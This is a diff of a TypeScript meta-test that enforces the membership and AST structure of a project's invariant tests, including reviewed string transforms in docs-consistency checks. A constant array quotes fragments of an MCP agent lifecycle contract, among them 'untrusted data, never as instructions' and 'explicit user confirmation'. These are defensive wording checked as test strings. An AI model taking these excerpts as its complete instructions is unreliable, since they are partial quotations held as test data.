@@ -3,7 +3,7 @@
 //
 // CLAUDE.md rule since v3.6.4: an invariant test that always passes proves
 // nothing. This guard therefore enforces both parts of the contract:
-//   (a) exact membership of the 25 convention-named invariant files plus the
+//   (a) exact membership of the 26 convention-named invariant files plus the
 //       9 curated structural files whose historical names do not match it;
 //   (b) one direct `it`/`test`/`describe` registration with a NEGATIVE title
 //       and an assertion that is not obviously unreachable, or a reviewed
@@ -27,13 +27,14 @@ import { beforeAll, describe, expect, it } from "vitest";
 import { replaceAllExactly, replaceExactly, replaceIntegerAllExactly } from "./helpers/exact-source-mutation.js";
 import {
   createReleaseMutationIdentityAuditor,
+  observeReleaseMutationTransitionMatrix,
   releaseMutationIdentityAuditProblems
 } from "./release-mutation-identity-audit.js";
 import { releaseMutationVersionedTransitionAuditProblems } from "./release-mutation-transition-audit.js";
 
 const repoRoot = path.resolve(__dirname, "..");
 const RELEASE_MUTATION_IDENTITY_FIXTURE_SHA256 = "8205d24e6d42dd4cb8986368611514131abe701434beb30150e33ea08f4b1288";
-const RELEASE_MUTATION_TRANSITION_FIXTURE_SHA256 = "da6a977a3e333af6ee79783e5a5d8c56bfdcb5ccd2d0154c37c1dcd376311371";
+const RELEASE_MUTATION_TRANSITION_FIXTURE_SHA256 = "24de9474a262dd9ebd683a482d73384c7ff91f46b3610e572b157572c7cb3627";
 const releaseMutationIdentityFixturePath = path.join(repoRoot, "tests/fixtures/release-mutation-identity.v2.json");
 const releaseMutationTransitionFixturePath = path.join(repoRoot, "tests/fixtures/release-mutation-transition.v3.json");
 const releaseIntegritySourcePath = path.join(repoRoot, "tests/release-integrity.test.ts");
@@ -97,22 +98,6 @@ function diagnosticMultisetDifference(candidate: readonly string[], baseline: re
   });
 }
 
-function refreshSourceSemanticFingerprint(source: MutableIdentityControlManifest["sources"][number]): void {
-  source.semanticFingerprint = `sha256:${sha256Text(
-    JSON.stringify({
-      normalizer: "release-matrix-balanced-v2",
-      source: {
-        order: source.order,
-        id: source.id,
-        legacyExpressions: source.legacyExpressions,
-        declarativeBinding: source.declarativeBinding,
-        origin: source.origin,
-        contentSha256: source.contentSha256
-      }
-    })
-  )}`;
-}
-
 function firstIdentityEntry<T>(values: readonly T[], label: string): T {
   const value = values[0];
   if (value === undefined) throw new Error(`release identity fixture has no ${label}`);
@@ -120,7 +105,7 @@ function firstIdentityEntry<T>(values: readonly T[], label: string): T {
 }
 
 // Freeze the convention-named side too: a one-for-one delete/add swap must not
-// evade review merely because the total count remains 34.
+// evade review merely because the total count remains 35.
 const EXPECTED_NAMED_STRUCTURAL_FILES = [
   "abs-path-leak-invariant.test.ts",
   "cache-isolation-invariant.test.ts",
@@ -146,6 +131,7 @@ const EXPECTED_NAMED_STRUCTURAL_FILES = [
   "scope-completeness-invariant.test.ts",
   "sink-parity-invariant.test.ts",
   "smoke-default-vault-invariant.test.ts",
+  "workflow-privilege-invariant.test.ts",
   "write-lifecycle-invariant.test.ts"
 ] as const;
 
@@ -208,11 +194,38 @@ const ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS = [
   }
 ] as const satisfies readonly ExactMutationHelperCallIdentity[];
 
+// These three controls used raw String.replace before the repository oracle
+// was widened. Pin their exact helper identities so a same-count unrelated
+// helper call cannot hide removal of the converted negative control.
+const DOCS_CONSISTENCY_CONVERTED_RAW_MUTATIONS = [
+  {
+    helper: "replaceExactly",
+    label: "coverage artifact action pin mutation",
+    needle: "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
+    replacement: "actions/download-artifact@v8",
+    sourceIdentifier: "downloadBlock"
+  },
+  {
+    helper: "replaceExactly",
+    label: "required CI inventory row mutation",
+    needle: "2. `docker`",
+    replacement: "2. `smoke`",
+    sourceIdentifier: "exactInventory"
+  },
+  {
+    helper: "replaceExactly",
+    label: "unprotected CI inventory mutation",
+    needle: "- `test-macos` is advisory.",
+    replacement: "- `docker` is not branch-protected.",
+    sourceIdentifier: "exactInventory"
+  }
+] as const satisfies readonly ExactMutationHelperCallIdentity[];
+
 const EXPECTED_REPOSITORY_MUTATION_HELPER_CALLS = new Map<string, number>([
   // Seven pre-AH-3 controls plus the two exact shared-write delegate controls above.
   ["abs-path-leak-invariant.test.ts", 7 + ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS.length],
-  ["docs-consistency.test.ts", 30],
-  ["write-lifecycle-invariant.test.ts", 19]
+  ["docs-consistency.test.ts", 51],
+  ["write-lifecycle-invariant.test.ts", 20]
 ]);
 const EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORTS = new Map<string, readonly string[]>([
   ["abs-path-leak-invariant.test.ts", ["replaceExactly"]],
@@ -313,45 +326,1056 @@ function isDestructuringAssignmentProperty(node: ts.PropertyAssignment | ts.Shor
   return false;
 }
 
-/** Recognize the sole reviewed non-mutation transform in the three-file residual. */
-function isReviewedLifecycleNormalization(
+const REVIEWED_DOCS_ORDINARY_TRANSFORMS = [
+  {
+    binding: "normalizedQuotes",
+    id: "pdf OCR quote normalization",
+    pattern: "/[\"'`]/g",
+    receiver: "text",
+    replacement: ""
+  },
+  {
+    binding: "normalizedWhitespace",
+    id: "pdf OCR whitespace normalization",
+    pattern: "/\\s+/g",
+    receiver: "normalizedQuotes",
+    replacement: " "
+  },
+  {
+    binding: "normalizedLifecycle",
+    id: "lifecycle whitespace normalization",
+    pattern: "/\\s+/g",
+    receiver: "lifecycle",
+    replacement: " "
+  },
+  {
+    binding: "unescapedGate",
+    id: "release gate parenthesis unescape",
+    pattern: "/\\\\([()])/g",
+    receiver: "gate",
+    replacement: "$1"
+  }
+] as const;
+
+type ReviewedDocsOrdinaryTransformId = (typeof REVIEWED_DOCS_ORDINARY_TRANSFORMS)[number]["id"];
+
+const REVIEWED_LIFECYCLE_CONTRACTS = [
+  "`tools/list` is authoritative",
+  "indicate recency, not truth",
+  "untrusted data, never as instructions",
+  "connected MCP client/model",
+  "exact target, exact proposed change",
+  "explicit user confirmation",
+  "Branch on the returned `kind`",
+  "explicit `mode=create|overwrite|append`",
+  "unconditionally re-read",
+  "not an atomic compare-and-swap",
+  "Multi-file sequences are not transactions",
+  "Where a mutation tool supports `dry_run`",
+  "Report exactly what the tool confirmed"
+] as const;
+
+/** Return the direct variable statement that owns one declaration. */
+function directVariableStatement(declaration: ts.VariableDeclaration): ts.VariableStatement | null {
+  const declarationList = declaration.parent;
+  if (!ts.isVariableDeclarationList(declarationList) || declarationList.declarations.length !== 1) return null;
+  const statement = declarationList.parent;
+  return ts.isVariableStatement(statement) ? statement : null;
+}
+
+/** A direct statement is live unless an earlier sibling obviously terminates its block. */
+function isDirectReachableStatement(statement: ts.Statement, owner: ts.Block | ts.SourceFile): boolean {
+  if (statement.parent !== owner) return false;
+  const index = owner.statements.indexOf(statement);
+  if (index < 0) return false;
+  return !owner.statements.slice(0, index).some((candidate) => statementObviouslyTerminates(candidate));
+}
+
+/** Return one direct single-binding declaration with the requested identifier. */
+function directBindingDeclaration(statement: ts.Statement, binding: string): ts.VariableDeclaration | null {
+  if (!ts.isVariableStatement(statement) || statement.declarationList.declarations.length !== 1) return null;
+  const declaration = statement.declarationList.declarations[0];
+  return declaration !== undefined && ts.isIdentifier(declaration.name) && declaration.name.text === binding
+    ? declaration
+    : null;
+}
+
+/** Match one exact reviewed replace call without considering its owner. */
+function reviewedTransformCall(
+  declaration: ts.VariableDeclaration,
+  receiverName: string,
+  patternText: string,
+  replacementText: string,
+  sourceFile: ts.SourceFile
+): ts.CallExpression | null {
+  const initializer = declaration.initializer;
+  if (
+    initializer === undefined ||
+    !ts.isCallExpression(initializer) ||
+    initializer.arguments.length !== 2 ||
+    !ts.isPropertyAccessExpression(initializer.expression) ||
+    initializer.expression.name.text !== "replace"
+  ) {
+    return null;
+  }
+  const receiver = unwrapStaticExpression(initializer.expression.expression);
+  const pattern = initializer.arguments[0];
+  const replacement = initializer.arguments[1];
+  return ts.isIdentifier(receiver) &&
+    receiver.text === receiverName &&
+    pattern !== undefined &&
+    ts.isRegularExpressionLiteral(pattern) &&
+    pattern.getText(sourceFile) === patternText &&
+    replacement !== undefined &&
+    ts.isStringLiteral(replacement) &&
+    replacement.text === replacementText
+    ? initializer
+    : null;
+}
+
+/** Count identifier spellings in one exact owner subtree. */
+function identifierCount(root: ts.Node, name: string): number {
+  let count = 0;
+  function visit(node: ts.Node): void {
+    if (ts.isIdentifier(node) && node.text === name) count++;
+    ts.forEachChild(node, visit);
+  }
+  visit(root);
+  return count;
+}
+
+/** Return every identifier occurrence with one exact spelling. */
+function identifiersNamed(root: ts.Node, name: string): readonly ts.Identifier[] {
+  const identifiers: ts.Identifier[] = [];
+  function visit(node: ts.Node): void {
+    if (ts.isIdentifier(node) && node.text === name) identifiers.push(node);
+    ts.forEachChild(node, visit);
+  }
+  visit(root);
+  return identifiers;
+}
+
+/** True only for a declaration in one direct const statement. */
+function isDirectConstDeclaration(declaration: ts.VariableDeclaration): boolean {
+  const statement = directVariableStatement(declaration);
+  return (
+    statement !== null &&
+    ts.isVariableDeclarationList(declaration.parent) &&
+    (declaration.parent.flags & ts.NodeFlags.Const) !== 0
+  );
+}
+
+/** Match a direct top-level describe callback by exact literal title. */
+function isExactDirectDescribeBlock(block: ts.Block, title: string): boolean {
+  const callback = block.parent;
+  if ((!ts.isArrowFunction(callback) && !ts.isFunctionExpression(callback)) || callback.body !== block) return false;
+  const call = callback.parent;
+  if (
+    !ts.isCallExpression(call) ||
+    registrationName(call) !== "describe" ||
+    registrationCallback(call) !== callback ||
+    call.arguments[0] === undefined ||
+    !ts.isStringLiteralLike(call.arguments[0]) ||
+    call.arguments[0].text !== title
+  ) {
+    return false;
+  }
+  const statement = call.parent;
+  return (
+    ts.isExpressionStatement(statement) &&
+    ts.isSourceFile(statement.parent) &&
+    isDirectReachableStatement(statement, statement.parent)
+  );
+}
+
+/** Match a direct live test callback inside one exact top-level describe. */
+function isExactDirectTestCallback(
+  callback: ts.ArrowFunction | ts.FunctionExpression,
+  title: string,
+  describeTitle: string
+): boolean {
+  const call = callback.parent;
+  if (
+    !ts.isCallExpression(call) ||
+    registrationName(call) !== "it" ||
+    registrationCallback(call) !== callback ||
+    call.arguments[0] === undefined ||
+    !ts.isStringLiteralLike(call.arguments[0]) ||
+    call.arguments[0].text !== title
+  ) {
+    return false;
+  }
+  const statement = call.parent;
+  if (!ts.isExpressionStatement(statement) || !ts.isBlock(statement.parent)) return false;
+  return (
+    isDirectReachableStatement(statement, statement.parent) &&
+    isExactDirectDescribeBlock(statement.parent, describeTitle)
+  );
+}
+
+/** Quote/whitespace transforms must remain the live three-statement normalize arrow. */
+function hasExactPdfNormalizationOwner(
+  id: ReviewedDocsOrdinaryTransformId,
+  declaration: ts.VariableDeclaration,
+  sourceFile: ts.SourceFile
+): boolean {
+  if (id !== "pdf OCR quote normalization" && id !== "pdf OCR whitespace normalization") return false;
+  const statement = directVariableStatement(declaration);
+  if (statement === null || !ts.isBlock(statement.parent)) return false;
+  const normalizeBlock = statement.parent;
+  if (normalizeBlock.statements.length !== 3 || !isDirectReachableStatement(statement, normalizeBlock)) return false;
+  const quoteDeclaration = directBindingDeclaration(normalizeBlock.statements[0] as ts.Statement, "normalizedQuotes");
+  const whitespaceDeclaration = directBindingDeclaration(
+    normalizeBlock.statements[1] as ts.Statement,
+    "normalizedWhitespace"
+  );
+  const returnStatement = normalizeBlock.statements[2];
+  if (
+    quoteDeclaration === null ||
+    whitespaceDeclaration === null ||
+    (declaration !== quoteDeclaration && declaration !== whitespaceDeclaration) ||
+    reviewedTransformCall(quoteDeclaration, "text", "/[\"'`]/g", "", sourceFile) === null ||
+    reviewedTransformCall(whitespaceDeclaration, "normalizedQuotes", "/\\s+/g", " ", sourceFile) === null ||
+    returnStatement === undefined ||
+    !ts.isReturnStatement(returnStatement) ||
+    returnStatement.expression === undefined ||
+    !ts.isCallExpression(returnStatement.expression) ||
+    returnStatement.expression.arguments.length !== 0 ||
+    !ts.isPropertyAccessExpression(returnStatement.expression.expression) ||
+    returnStatement.expression.expression.name.text !== "toLowerCase" ||
+    !ts.isIdentifier(returnStatement.expression.expression.expression) ||
+    returnStatement.expression.expression.expression.text !== "normalizedWhitespace" ||
+    identifierCount(normalizeBlock, "text") !== 1 ||
+    identifierCount(normalizeBlock, "normalizedQuotes") !== 2 ||
+    identifierCount(normalizeBlock, "normalizedWhitespace") !== 2
+  ) {
+    return false;
+  }
+
+  const normalizeArrow = normalizeBlock.parent;
+  if (
+    !ts.isArrowFunction(normalizeArrow) ||
+    normalizeArrow.body !== normalizeBlock ||
+    normalizeArrow.parameters.length !== 1 ||
+    !ts.isIdentifier(normalizeArrow.parameters[0]?.name) ||
+    normalizeArrow.parameters[0].name.text !== "text"
+  ) {
+    return false;
+  }
+  const normalizeDeclaration = normalizeArrow.parent;
+  if (
+    !ts.isVariableDeclaration(normalizeDeclaration) ||
+    normalizeDeclaration.initializer !== normalizeArrow ||
+    !ts.isIdentifier(normalizeDeclaration.name) ||
+    normalizeDeclaration.name.text !== "normalize"
+  ) {
+    return false;
+  }
+  const normalizeStatement = directVariableStatement(normalizeDeclaration);
+  if (normalizeStatement === null || !ts.isBlock(normalizeStatement.parent)) return false;
+  const ownerBody = normalizeStatement.parent;
+  const owner = ownerBody.parent;
+  const readStatement = ownerBody.statements[1];
+  const ocrStatement = ownerBody.statements[2];
+  if (readStatement === undefined || ocrStatement === undefined) return false;
+  const readDeclaration = directBindingDeclaration(readStatement, "read");
+  const ocrDeclaration = directBindingDeclaration(ocrStatement, "ocr");
+  const isExactNormalizeInvocation = (
+    candidate: ts.VariableDeclaration | null,
+    argumentName: "readPdf" | "ocrPdf"
+  ): boolean =>
+    candidate?.initializer !== undefined &&
+    ts.isCallExpression(candidate.initializer) &&
+    candidate.initializer.arguments.length === 1 &&
+    ts.isIdentifier(candidate.initializer.expression) &&
+    candidate.initializer.expression.text === "normalize" &&
+    ts.isIdentifier(candidate.initializer.arguments[0]) &&
+    candidate.initializer.arguments[0].text === argumentName;
+  return (
+    ts.isFunctionDeclaration(owner) &&
+    owner.body === ownerBody &&
+    owner.name?.text === "pdfOcrPublicContractProblems" &&
+    owner.parameters.length === 2 &&
+    ts.isIdentifier(owner.parameters[0]?.name) &&
+    owner.parameters[0].name.text === "readPdf" &&
+    ts.isIdentifier(owner.parameters[1]?.name) &&
+    owner.parameters[1].name.text === "ocrPdf" &&
+    ownerBody.statements[0] === normalizeStatement &&
+    readDeclaration !== null &&
+    ocrDeclaration !== null &&
+    isExactNormalizeInvocation(readDeclaration, "readPdf") &&
+    isExactNormalizeInvocation(ocrDeclaration, "ocrPdf") &&
+    identifierCount(ownerBody, "normalize") === 3 &&
+    isDirectReachableStatement(normalizeStatement, ownerBody) &&
+    isDirectReachableStatement(readStatement, ownerBody) &&
+    isDirectReachableStatement(ocrStatement, ownerBody) &&
+    ts.isSourceFile(owner.parent) &&
+    isDirectReachableStatement(owner, owner.parent)
+  );
+}
+
+/** Lifecycle normalization must feed the immediately following contract assertion loop. */
+function hasExactLifecycleNormalizationOwner(declaration: ts.VariableDeclaration): boolean {
+  const statement = directVariableStatement(declaration);
+  if (statement === null || !ts.isBlock(statement.parent)) return false;
+  const callbackBody = statement.parent;
+  const callback = callbackBody.parent;
+  if (
+    (!ts.isArrowFunction(callback) && !ts.isFunctionExpression(callback)) ||
+    callback.body !== callbackBody ||
+    !isExactDirectTestCallback(
+      callback,
+      "README, ROADMAP, and recipe prompt claims match the actual prompt contract",
+      "docs/code consistency — numeric claims (v3.5.1 audit-driven)"
+    ) ||
+    !isDirectReachableStatement(statement, callbackBody)
+  ) {
+    return false;
+  }
+  const statementIndex = callbackBody.statements.indexOf(statement);
+  const consumer = callbackBody.statements[statementIndex + 1];
+  if (consumer === undefined || !ts.isForOfStatement(consumer) || !ts.isBlock(consumer.statement)) return false;
+  const contractDeclaration = ts.isVariableDeclarationList(consumer.initializer)
+    ? consumer.initializer.declarations[0]
+    : undefined;
+  if (
+    contractDeclaration === undefined ||
+    consumer.initializer.declarations.length !== 1 ||
+    !ts.isIdentifier(contractDeclaration.name) ||
+    contractDeclaration.name.text !== "contract" ||
+    !ts.isArrayLiteralExpression(consumer.expression) ||
+    consumer.expression.elements.some((element) => !ts.isStringLiteral(element)) ||
+    JSON.stringify(
+      consumer.expression.elements.map((element) => (ts.isStringLiteral(element) ? element.text : null))
+    ) !== JSON.stringify(REVIEWED_LIFECYCLE_CONTRACTS) ||
+    consumer.statement.statements.length !== 1 ||
+    identifierCount(consumer, "normalizedLifecycle") !== 1 ||
+    identifierCount(callbackBody, "normalizedLifecycle") !== 2
+  ) {
+    return false;
+  }
+  let exactConsumer = false;
+  function visit(node: ts.Node): void {
+    if (
+      ts.isIdentifier(node) &&
+      node.text === "normalizedLifecycle" &&
+      ts.isCallExpression(node.parent) &&
+      node.parent.arguments[0] === node &&
+      ts.isIdentifier(node.parent.expression) &&
+      node.parent.expression.text === "expect" &&
+      ts.isPropertyAccessExpression(node.parent.parent) &&
+      node.parent.parent.expression === node.parent &&
+      node.parent.parent.name.text === "toContain" &&
+      ts.isCallExpression(node.parent.parent.parent) &&
+      node.parent.parent.parent.expression === node.parent.parent &&
+      node.parent.parent.parent.arguments.length === 1 &&
+      ts.isIdentifier(node.parent.parent.parent.arguments[0]) &&
+      node.parent.parent.parent.arguments[0].text === "contract"
+    ) {
+      exactConsumer = true;
+    }
+    ts.forEachChild(node, visit);
+  }
+  visit(consumer);
+  if (!exactConsumer) return false;
+
+  const directDeclarations = callbackBody.statements.flatMap((candidate) =>
+    ts.isVariableStatement(candidate) ? [...candidate.declarationList.declarations] : []
+  );
+  const declarationNamed = (name: string): ts.VariableDeclaration | null => {
+    const matches = directDeclarations.filter(
+      (candidate) => ts.isIdentifier(candidate.name) && candidate.name.text === name
+    );
+    return matches.length === 1 ? (matches[0] ?? null) : null;
+  };
+  const recipesDeclaration = declarationNamed("recipes");
+  const lifecycleMatchDeclaration = declarationNamed("lifecycleMatch");
+  const lifecycleDeclaration = declarationNamed("lifecycle");
+  if (
+    recipesDeclaration === null ||
+    lifecycleMatchDeclaration === null ||
+    lifecycleDeclaration === null ||
+    !isDirectConstDeclaration(recipesDeclaration) ||
+    !isDirectConstDeclaration(lifecycleMatchDeclaration) ||
+    !isDirectConstDeclaration(lifecycleDeclaration)
+  ) {
+    return false;
+  }
+  const recipesStatement = directVariableStatement(recipesDeclaration);
+  const lifecycleMatchStatement = directVariableStatement(lifecycleMatchDeclaration);
+  const lifecycleStatement = directVariableStatement(lifecycleDeclaration);
+  if (recipesStatement === null || lifecycleMatchStatement === null || lifecycleStatement === null) return false;
+  const recipesIndex = callbackBody.statements.indexOf(recipesStatement);
+  const lifecycleMatchIndex = callbackBody.statements.indexOf(lifecycleMatchStatement);
+  const lifecycleIndex = callbackBody.statements.indexOf(lifecycleStatement);
+  if (
+    lifecycleMatchIndex !== recipesIndex + 1 ||
+    lifecycleIndex !== lifecycleMatchIndex + 2 ||
+    lifecycleIndex >= statementIndex ||
+    !isDirectReachableStatement(recipesStatement, callbackBody) ||
+    !isDirectReachableStatement(lifecycleMatchStatement, callbackBody) ||
+    !isDirectReachableStatement(lifecycleStatement, callbackBody)
+  ) {
+    return false;
+  }
+
+  const recipesInitializer = recipesDeclaration.initializer;
+  const recipesReadCall =
+    recipesInitializer !== undefined && ts.isAwaitExpression(recipesInitializer) ? recipesInitializer.expression : null;
+  const lifecycleMatchInitializer = lifecycleMatchDeclaration.initializer;
+  const lifecycleInitializer = lifecycleDeclaration.initializer;
+  if (
+    recipesReadCall === null ||
+    !ts.isCallExpression(recipesReadCall) ||
+    recipesReadCall.arguments.length !== 1 ||
+    !ts.isIdentifier(recipesReadCall.expression) ||
+    recipesReadCall.expression.text !== "read" ||
+    !ts.isStringLiteral(recipesReadCall.arguments[0]) ||
+    recipesReadCall.arguments[0].text !== "examples/README.md" ||
+    lifecycleMatchInitializer === undefined ||
+    !ts.isCallExpression(lifecycleMatchInitializer) ||
+    lifecycleMatchInitializer.arguments.length !== 1 ||
+    !ts.isIdentifier(lifecycleMatchInitializer.arguments[0]) ||
+    lifecycleMatchInitializer.arguments[0].text !== "recipes" ||
+    !ts.isPropertyAccessExpression(lifecycleMatchInitializer.expression) ||
+    lifecycleMatchInitializer.expression.name.text !== "exec" ||
+    !ts.isRegularExpressionLiteral(lifecycleMatchInitializer.expression.expression) ||
+    lifecycleMatchInitializer.expression.expression.getText() !==
+      "/## Agent lifecycle recipes([\\s\\S]*?)(?=\\n## )/" ||
+    lifecycleInitializer === undefined ||
+    !ts.isBinaryExpression(lifecycleInitializer) ||
+    lifecycleInitializer.operatorToken.kind !== ts.SyntaxKind.QuestionQuestionToken ||
+    !ts.isElementAccessExpression(lifecycleInitializer.left) ||
+    lifecycleInitializer.left.questionDotToken === undefined ||
+    !ts.isIdentifier(lifecycleInitializer.left.expression) ||
+    lifecycleInitializer.left.expression.text !== "lifecycleMatch" ||
+    lifecycleInitializer.left.argumentExpression === undefined ||
+    !ts.isNumericLiteral(lifecycleInitializer.left.argumentExpression) ||
+    lifecycleInitializer.left.argumentExpression.text !== "1" ||
+    !ts.isStringLiteral(lifecycleInitializer.right) ||
+    lifecycleInitializer.right.text !== ""
+  ) {
+    return false;
+  }
+
+  const recipesReferences = identifiersNamed(callbackBody, "recipes");
+  const lifecycleMatchReferences = identifiersNamed(callbackBody, "lifecycleMatch");
+  const lifecycleReferences = identifiersNamed(callbackBody, "lifecycle");
+  const lifecycleDirectExpectArguments = lifecycleReferences.filter(
+    (identifier) =>
+      ts.isCallExpression(identifier.parent) &&
+      identifier.parent.arguments[0] === identifier &&
+      ts.isIdentifier(identifier.parent.expression) &&
+      identifier.parent.expression.text === "expect"
+  );
+  const lifecycleOverclaimArguments = lifecycleReferences.filter(
+    (identifier) =>
+      ts.isCallExpression(identifier.parent) &&
+      identifier.parent.arguments[0] === identifier &&
+      ts.isIdentifier(identifier.parent.expression) &&
+      identifier.parent.expression.text === "findRecipeOverclaim"
+  );
+  const lifecycleReplaceReceivers = lifecycleReferences.filter(
+    (identifier) =>
+      ts.isPropertyAccessExpression(identifier.parent) &&
+      identifier.parent.expression === identifier &&
+      identifier.parent.name.text === "replace"
+  );
+  return (
+    recipesReferences.length === 2 &&
+    recipesReferences.includes(recipesDeclaration.name as ts.Identifier) &&
+    recipesReferences.includes(lifecycleMatchInitializer.arguments[0] as ts.Identifier) &&
+    lifecycleMatchReferences.length === 3 &&
+    lifecycleMatchReferences.includes(lifecycleMatchDeclaration.name as ts.Identifier) &&
+    lifecycleMatchReferences.includes(lifecycleInitializer.left.expression as ts.Identifier) &&
+    lifecycleMatchReferences.some(
+      (identifier) =>
+        ts.isCallExpression(identifier.parent) &&
+        identifier.parent.arguments[0] === identifier &&
+        ts.isIdentifier(identifier.parent.expression) &&
+        identifier.parent.expression.text === "expect"
+    ) &&
+    lifecycleReferences.length === 5 &&
+    lifecycleReferences.includes(lifecycleDeclaration.name as ts.Identifier) &&
+    lifecycleDirectExpectArguments.length === 2 &&
+    lifecycleOverclaimArguments.length === 1 &&
+    lifecycleReplaceReceivers.length === 1
+  );
+}
+
+/** Gate unescape must be the live local consumed by the immediately following return. */
+function hasExactGateUnescapeOwner(declaration: ts.VariableDeclaration): boolean {
+  const statement = directVariableStatement(declaration);
+  if (statement === null || !ts.isBlock(statement.parent)) return false;
+  const mapBody = statement.parent;
+  const returnStatement = mapBody.statements[1];
+  if (
+    mapBody.statements.length !== 2 ||
+    mapBody.statements[0] !== statement ||
+    !isDirectReachableStatement(statement, mapBody) ||
+    returnStatement === undefined ||
+    !ts.isReturnStatement(returnStatement) ||
+    returnStatement.expression === undefined ||
+    !ts.isIdentifier(returnStatement.expression) ||
+    returnStatement.expression.text !== "unescapedGate" ||
+    identifierCount(mapBody, "gate") !== 1 ||
+    identifierCount(mapBody, "unescapedGate") !== 2
+  ) {
+    return false;
+  }
+  const mapCallback = mapBody.parent;
+  if (
+    !ts.isArrowFunction(mapCallback) ||
+    mapCallback.body !== mapBody ||
+    mapCallback.parameters.length !== 1 ||
+    !ts.isIdentifier(mapCallback.parameters[0]?.name) ||
+    mapCallback.parameters[0].name.text !== "gate"
+  ) {
+    return false;
+  }
+  const mapCall = mapCallback.parent;
+  if (
+    !ts.isCallExpression(mapCall) ||
+    mapCall.arguments.length !== 1 ||
+    mapCall.arguments[0] !== mapCallback ||
+    !ts.isPropertyAccessExpression(mapCall.expression) ||
+    mapCall.expression.name.text !== "map" ||
+    !ts.isReturnStatement(mapCall.parent) ||
+    mapCall.parent.expression !== mapCall ||
+    !ts.isBlock(mapCall.parent.parent)
+  ) {
+    return false;
+  }
+  const splitCall = mapCall.expression.expression;
+  if (
+    !ts.isCallExpression(splitCall) ||
+    splitCall.arguments.length !== 1 ||
+    !ts.isStringLiteral(splitCall.arguments[0]) ||
+    splitCall.arguments[0].text !== "|" ||
+    !ts.isPropertyAccessExpression(splitCall.expression) ||
+    splitCall.expression.name.text !== "split"
+  ) {
+    return false;
+  }
+  const splitReceiver = unwrapStaticExpression(splitCall.expression.expression);
+  if (
+    !ts.isBinaryExpression(splitReceiver) ||
+    splitReceiver.operatorToken.kind !== ts.SyntaxKind.QuestionQuestionToken ||
+    !ts.isElementAccessExpression(splitReceiver.left) ||
+    !ts.isIdentifier(splitReceiver.left.expression) ||
+    splitReceiver.left.expression.text !== "m" ||
+    splitReceiver.left.argumentExpression === undefined ||
+    !ts.isNumericLiteral(splitReceiver.left.argumentExpression) ||
+    splitReceiver.left.argumentExpression.text !== "1" ||
+    !ts.isStringLiteral(splitReceiver.right) ||
+    splitReceiver.right.text !== ""
+  ) {
+    return false;
+  }
+  const ownerBody = mapCall.parent.parent;
+  const owner = ownerBody.parent;
+  const releaseYmlStatement = ownerBody.statements[0];
+  const matchStatement = ownerBody.statements[1];
+  const matchGuard = ownerBody.statements[2];
+  const returnOwnerStatement = ownerBody.statements[3];
+  if (
+    ownerBody.statements.length !== 4 ||
+    releaseYmlStatement === undefined ||
+    matchStatement === undefined ||
+    matchGuard === undefined ||
+    returnOwnerStatement === undefined ||
+    returnOwnerStatement !== mapCall.parent
+  ) {
+    return false;
+  }
+  const releaseYmlDeclaration = directBindingDeclaration(releaseYmlStatement, "releaseYml");
+  const matchDeclaration = directBindingDeclaration(matchStatement, "m");
+  const releaseYmlInitializer = releaseYmlDeclaration?.initializer;
+  const readCall =
+    releaseYmlInitializer !== undefined && ts.isAwaitExpression(releaseYmlInitializer)
+      ? releaseYmlInitializer.expression
+      : null;
+  const matchInitializer = matchDeclaration?.initializer;
+  if (
+    readCall === null ||
+    !ts.isCallExpression(readCall) ||
+    readCall.arguments.length !== 1 ||
+    !ts.isIdentifier(readCall.expression) ||
+    readCall.expression.text !== "read" ||
+    !ts.isStringLiteral(readCall.arguments[0]) ||
+    readCall.arguments[0].text !== ".github/workflows/release.yml" ||
+    matchInitializer === undefined ||
+    !ts.isCallExpression(matchInitializer) ||
+    matchInitializer.arguments.length !== 1 ||
+    !ts.isIdentifier(matchInitializer.arguments[0]) ||
+    matchInitializer.arguments[0].text !== "releaseYml" ||
+    !ts.isPropertyAccessExpression(matchInitializer.expression) ||
+    matchInitializer.expression.name.text !== "exec" ||
+    !ts.isRegularExpressionLiteral(matchInitializer.expression.expression) ||
+    matchInitializer.expression.expression.getText() !== '/REQUIRED="([^"]+)"/' ||
+    !ts.isIfStatement(matchGuard) ||
+    matchGuard.elseStatement !== undefined ||
+    !ts.isPrefixUnaryExpression(matchGuard.expression) ||
+    matchGuard.expression.operator !== ts.SyntaxKind.ExclamationToken ||
+    !ts.isIdentifier(matchGuard.expression.operand) ||
+    matchGuard.expression.operand.text !== "m" ||
+    !ts.isThrowStatement(matchGuard.thenStatement) ||
+    identifierCount(ownerBody, "releaseYml") !== 2 ||
+    identifierCount(ownerBody, "m") !== 3
+  ) {
+    return false;
+  }
+  if (
+    !ts.isFunctionDeclaration(owner) ||
+    owner.body !== ownerBody ||
+    owner.name?.text !== "requiredCiGates" ||
+    owner.parameters.length !== 0 ||
+    !isDirectReachableStatement(releaseYmlStatement, ownerBody) ||
+    !isDirectReachableStatement(matchStatement, ownerBody) ||
+    !isDirectReachableStatement(matchGuard, ownerBody) ||
+    !isDirectReachableStatement(returnOwnerStatement, ownerBody) ||
+    !ts.isBlock(owner.parent) ||
+    !isDirectReachableStatement(owner, owner.parent)
+  ) {
+    return false;
+  }
+  return isExactDirectDescribeBlock(
+    owner.parent,
+    "docs/code consistency — AI-agent text surfaces + AGENTS.md numeric claims"
+  );
+}
+
+/** Bind each reviewed tuple to its exact live owner and consumer. */
+function hasExactReviewedTransformOwner(
+  id: ReviewedDocsOrdinaryTransformId,
+  declaration: ts.VariableDeclaration,
+  sourceFile: ts.SourceFile
+): boolean {
+  if (id === "pdf OCR quote normalization" || id === "pdf OCR whitespace normalization") {
+    return hasExactPdfNormalizationOwner(id, declaration, sourceFile);
+  }
+  if (id === "lifecycle whitespace normalization") return hasExactLifecycleNormalizationOwner(declaration);
+  return hasExactGateUnescapeOwner(declaration);
+}
+
+/** Recognize each reviewed non-mutation transform by its full AST identity. */
+function reviewedDocsOrdinaryTransformId(
   filename: string,
   node: ts.PropertyAccessExpression,
   sourceFile: ts.SourceFile
-): boolean {
-  if (filename !== "docs-consistency.test.ts" || node.name.text !== "replace") return false;
+): ReviewedDocsOrdinaryTransformId | null {
+  if (filename !== "docs-consistency.test.ts" || node.name.text !== "replace") return null;
   const receiver = unwrapStaticExpression(node.expression);
-  if (!ts.isIdentifier(receiver) || receiver.text !== "lifecycle") return false;
+  if (!ts.isIdentifier(receiver)) return null;
 
   const call = node.parent;
